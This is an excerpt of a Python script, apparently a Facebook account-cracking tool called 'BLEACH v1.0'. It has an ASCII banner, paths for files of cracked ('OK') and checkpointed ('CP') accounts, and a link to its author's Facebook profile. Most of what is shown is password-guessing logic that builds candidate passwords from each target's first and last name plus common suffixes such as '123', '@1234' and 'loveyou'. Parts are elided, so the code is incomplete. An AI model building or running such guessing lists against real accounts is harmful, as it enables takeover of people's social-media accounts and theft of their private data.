...
logo=("""    
 .______    __       _______     ___       ______  __    __  
|   _  \  |  |     |   ____|   /   \     /      ||  |  |  | 
|  |_)  | |  |     |  |__     /  ^  \   |  ,----'|  |__|  | 
|   _  <  |  |     |   __|   /  /_\  \  |  |     |   __   | 
|  |_)  | |  `----.|  |____ /  _____  \ |  `----.|  |  |  | 
|______/  |_______||_______/__/     \__\ \______||__|  |__| v1.0""")
...
def harryresults():
    ok_file_path = '/sdcard/BLEACHv1/BLEACHv1-OK.txt'
    cp_file_path = '/sdcard/BLEACHv1/BLEACHv1-CP.txt'
...
def contact():
	os.system('xdg-open https://www.facebook.com/terobau.rijan')
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				if len(frs)<3:
					...
					pwv.append(frs+lst+'098')
					pwv.append(frs+lst+'54321')
					pwv.append(frs+lst+'@@@@@@@@')
					pwv.append(frs+lst+'@@@1234@@')
					pwv.append(frs+lst+'@321')
					pwv.append(lst+frs+'123')
					pwv.append(lst+frs+'122333')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					...
					pwv.append(frs+'@12')
					pwv.append(frs+'Don')
					pwv.append(frs+'123789')
					pwv.append(frs+'123456789')
					pwv.append(frs+'loveyou')
					pwv.append(frs+'fflover')
					pwv.append(frs+'pubglovet')
					pwv.append(frs+lst+'king123')
					pwv.append(frs+lst+'1234')
					pwv.append(frs+lst+'@123')
					pwv.append(frs+lst+'@1234')
					pwv.append(frs+lst+'321')
